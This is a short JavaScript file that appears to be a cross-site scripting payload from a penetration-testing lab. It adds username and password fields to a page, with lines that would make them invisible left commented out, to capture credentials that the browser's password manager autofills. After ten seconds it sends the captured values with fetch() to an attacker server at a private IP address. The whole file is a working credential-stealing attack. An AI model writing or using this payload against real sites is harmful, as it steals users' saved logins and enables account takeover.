const SERVER = '192.168.45.159';
const PORT = '8081';

const username = document.createElement('input');
username.type = 'text';
username.style.position = 'fixed';
username.setAttribute('name', 'username');
username.setAttribute('autocomplete', 'username');
// username.style.opacity = '0';

const password = document.createElement('input');
password.type = 'password';
password.style.position = 'fixed';
// password.style.opacity = '0';

const body = document.getElementsByTagName('body')[0];
body.append(username);
body.append(password);

setTimeout(() => {
  const uname = encodeURIComponent(username.value);
  const pass = encodeURIComponent(password.value);

  fetch(`http://${SERVER}:${PORT}/credentials?u=${uname}&p=${pass}`);
}, 10000);
